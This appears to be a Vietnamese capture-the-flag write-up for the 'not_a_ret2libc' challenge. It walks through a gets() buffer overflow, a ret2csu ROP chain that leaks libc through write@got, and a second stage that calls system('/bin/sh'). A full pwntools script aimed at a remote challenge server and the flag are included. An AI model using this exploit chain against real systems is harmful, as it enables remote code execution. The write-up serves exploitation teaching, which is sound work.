# not\_a\_ret2libc (Pwn)

Bài này đưa sẵn source code, libc

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

{% code title="not_ret2libc.c" lineNumbers="true" %}
```c
#include <stdio.h>

int main()
{
    char buf;
    write(1,"give me something please: ",0x1b);
    gets(&buf);
return 0;
}
```
{% endcode %}

Nhìn đề bài cho libc là biết phải leak được libc ( don't care about the title :))) ). Mình sẽ cố gắng gọi  `write(1,write@got,8)`

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Bài này không có `pop rdx` gadget nên mình nghĩ tới cách ret2csu.

Kiểm tra hàm `__libc_csu_init`

```asmatmel
   0x00000000004011a0 <+0>:     endbr64 
   0x00000000004011a4 <+4>:     push   r15
   0x00000000004011a6 <+6>:     lea    r15,[rip+0x2c63]        # 0x403e10
   0x00000000004011ad <+13>:    push   r14
   0x00000000004011af <+15>:    mov    r14,rdx
   0x00000000004011b2 <+18>:    push   r13
   0x00000000004011b4 <+20>:    mov    r13,rsi
   0x00000000004011b7 <+23>:    push   r12
   0x00000000004011b9 <+25>:    mov    r12d,edi
   0x00000000004011bc <+28>:    push   rbp
   0x00000000004011bd <+29>:    lea    rbp,[rip+0x2c54]        # 0x403e18
   0x00000000004011c4 <+36>:    push   rbx
   0x00000000004011c5 <+37>:    sub    rbp,r15
   0x00000000004011c8 <+40>:    sub    rsp,0x8
   0x00000000004011cc <+44>:    call   0x401000 <_init>
   0x00000000004011d1 <+49>:    sar    rbp,0x3
   0x00000000004011d5 <+53>:    je     0x4011f6 <__libc_csu_init+86>
   0x00000000004011d7 <+55>:    xor    ebx,ebx
   0x00000000004011d9 <+57>:    nop    DWORD PTR [rax+0x0]
   0x00000000004011e0 <+64>:    mov    rdx,r14
   0x00000000004011e3 <+67>:    mov    rsi,r13
   0x00000000004011e6 <+70>:    mov    edi,r12d
   0x00000000004011e9 <+73>:    call   QWORD PTR [r15+rbx*8]
   0x00000000004011ed <+77>:    add    rbx,0x1
   0x00000000004011f1 <+81>:    cmp    rbp,rbx
   0x00000000004011f4 <+84>:    jne    0x4011e0 <__libc_csu_init+64>
   0x00000000004011f6 <+86>:    add    rsp,0x8
   0x00000000004011fa <+90>:    pop    rbx
   0x00000000004011fb <+91>:    pop    rbp
   0x00000000004011fc <+92>:    pop    r12
   0x00000000004011fe <+94>:    pop    r13
   0x0000000000401200 <+96>:    pop    r14
   0x0000000000401202 <+98>:    pop    r15
   0x0000000000401204 <+100>:   ret  
```

Yeah, tại `__libc_csu_init+64`  có gadget `mov rdx,r14` giúp ta ghi thanh rdx.

Đầu tiên mình sẽ sử dụng các gadget bắt đầu ở `__libc_csu_init+90` để ghi các giá trị mong muốn vào cách thanh ghi.

`mov rdx,r14` -> ghi đè r14=8

`mov rsi,r13` -> ghi đè r13=write@got

`mov edi,r12d` -> ghi đè r12=1

`call QWORD PTR [r15+rbx*8]` -> ghi đè r15=write@got và rbx=0

`add rbx,0x1; cmp rbp,rbx` -> ghi đè rbp=1 để thoát loop `jne 0x4011e0` `<__libc_csu_init+64>`

ROPchain đầu tiên

```python
payload =b'0'
payload =b'0'
payload+=b'A'*8
payload+=p64(0x00000000004011fa)
payload+=p64(0) #rbx=0
payload+=p64(1) #rbp=1
payload+=p64(1)#r12=1 mov rdi, r12d
payload+=p64(exe.got["write"])#r13 mov rsi,r13
payload+=p64(8)#r14=8 mov rdx,r14
payload+=p64(exe.got["write"])#r15 -> call *(r15+rbx*8)
payload+=p64(0x00000000004011e0)
payload+=p64(0)*7 #padding
payload+=p64(exe.sym["main"]) #back to main
```

Đoạn sau chỉ cần lợi dụng địa chỉ của hàm `write` bị leak để tính địa chỉ của chuỗi `"/bin/sh"` và hàm `system`

```python
system=libc.sym["system"]-libc.sym["write"]+int(leak.hex(),16)
binsh=next(libc.search(b"/bin/sh"))-libc.sym["write"]+int(leak.hex(),16)
log.info(hex(system))
log.info(hex(binsh))
```

ROPchain trước đã giúp ta quay lại hàm main, giờ gửi thêm ROPchain mới để gọi hàm system

```python
payload =b'0'
payload+=b'A'*8
payload+=p64(pop_rdi_ret)
payload+=p64(binsh)
payload+=p64(0x0000000000401204)#ret
payload+=p64(system)
```

Scirpt giải

```python
#!/usr/bin/env python3
from pwn import *
from time import sleep
exe = ELF("not_a_ret2libc_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
pop_rdi_ret=0x0000000000401203
pop_rsi_pop_r15_ret=0x0000000000401201
context.binary = exe
context.log_level='debug'
#p=exe.process()
#gdb.attach(p,gdbscript="b *main+62")
p=remote("45.122.249.68",10022)
#stage1
p.recv()
sleep(1)
payload =b'0'
payload+=b'A'*8
payload+=p64(0x00000000004011fa)
payload+=p64(0) #rbx=0
payload+=p64(1) #rbp
payload+=p64(1)#r12=1 mov rdi, r12d
payload+=p64(exe.got["write"])#r13 mov rsi,r13
payload+=p64(8)#r14=8 mov rdx,r15
payload+=p64(exe.got["write"])#r15 -> call *(r15+rbx*8)
payload+=p64(0x00000000004011e0)
payload+=p64(0)*7 #padding
payload+=p64(exe.sym["main"])
p.sendline(payload)
sleep(1)
leak=p.recv()[:8][::-1]
sleep(1)
log.info(leak.hex())
#calculate
system=libc.sym["system"]-libc.sym["write"]+int(leak.hex(),16)
binsh=next(libc.search(b"/bin/sh"))-libc.sym["write"]+int(leak.hex(),16)
log.info(hex(system))
log.info(hex(binsh))
#stage2
payload =b'0'
payload+=b'A'*8
payload+=p64(pop_rdi_ret)
payload+=p64(binsh)
payload+=p64(0x0000000000401204)#ret
payload+=p64(system)
p.sendline(payload)
sleep(1)
p.interactive()
```

<figure><img src="../../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

Flag: `W1{t0o_m4nY_g4dg3t_f0r_Xplo1t}`







